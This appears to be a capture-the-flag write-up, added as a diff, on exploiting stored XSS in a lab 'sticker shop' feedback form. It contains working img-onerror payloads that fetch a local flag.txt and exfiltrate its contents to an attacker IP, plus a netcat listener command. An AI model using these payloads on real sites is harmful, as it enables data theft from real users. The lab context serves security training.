@@ -1,0 +1,58 @@
+-------------------------------------------------------------------------------------------------------------------------------------
+
+NOTE:-
+
+You're crafting a JavaScript-based XSS payload with the goal of exfiltrating the contents of http://127.0.0.1:8080/flag.txt from a vulnerable browser and sending it to your machine (10.11.116.53).
+🔍 What this payload does:
+
+<img src="x" onerror="
+  fetch('http://127.0.0.1:8080/flag.txt')
+    .then(r => r.text())
+    .then(r => fetch('http://10.11.116.53:8080/?c=' + r))
+    .catch(e => fetch('http://10.11.116.53:8080/?c=' + e))
+"/>
+explanation:-
+    <img src="x": The image fails to load, triggering onerror.
+    fetch('http://127.0.0.1:8080/flag.txt'): Attempts to read a local service or file on the victim's machine.
+    fetch('http://10.11.116.53:8080/?c=' + r): Sends the response (e.g. flag contents) to your server.
+    catch(...): If it fails, it sends the error to your server for debugging.
+
+✅ Considerations:
+
+    This only works if:
+
+        The victim's browser executes JavaScript in an XSS context.
+        The browser allows cross-origin fetch from localhost — modern browsers block this (CORS).
+        127.0.0.1:8080 is actually running a service serving flag.txt.
+        The victim’s network can reach your machine at 10.11.116.53:8080.
+
+-------------------------------------------------------------------------------------------------------------------------------------
+
+In this challenge, we are tasked with retrieving a flag from a web server hosted by a local sticker shop. The scenario highlights poor security practices, as the server is hosted on the same machine used for everyday activities like browsing the internet and checking customer feedback. This setup exposes the server to various potential vulnerabilities. The goal is to identify and exploit these weaknesses to access the flag located at http://10.10.72.150:8080/flag.txt. This write up details the systematic approach used to uncover and exploit the vulnerability to achieve the objective.
+
+Let’s visit http://10.10.72.150:8080. At first glance, the page doesn’t seem to have anything particularly interesting. However, it does feature a "Feedback" tab. Let’s explore it further to see if it reveals any useful information or functionality.
+
+Now, let’s start a Netcat listener on the attacker’s machine by running the following command:
+
+nc -knvlp 8080
+
+This will set up a listener on port 8080 to capture any incoming connections.
+
+Next, we’ll test for potential Cross-Site Scripting (XSS) vulnerabilities by sending the following payload through the “Feedback” form or any input field that allows HTML:
+
+<img src=x onerror="fetch('http://10.11.116.53:8080')"/>
+
+This payload attempts to trigger an HTTP request to the attacker’s IP (10.11.116.53) when the error occurs in the image tag.
+
+After submitting the payload, monitor the Netcat listener for any incoming connections. If the XSS vulnerability is present and executed, you should see a connection on your listener from the vulnerable web server, indicating that the payload was triggered successfully.
+
+Now that we have discovered the XSS vulnerability, let’s craft a payload that will visit /flag.txt and send its contents to our listener server. The following payload is designed to do just that:
+
+<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.11.116.53:8080/?c=' + r)).catch(e => fetch('http://10.11.116.53:8080/?c=' + e))"/>
+
+Explanation:
+
+    The payload first attempts to fetch the contents of http://127.0.0.1:8080/flag.txt, where the flag is likely stored.
+    It then sends the contents (or any error) to the attacker’s server at http://10.11.116.53:8080, appending the response as a query parameter (?c=<response>).
+    This ensures that, if the fetch request is successful, the contents of the flag.txt file will be exfiltrated to our server.
+
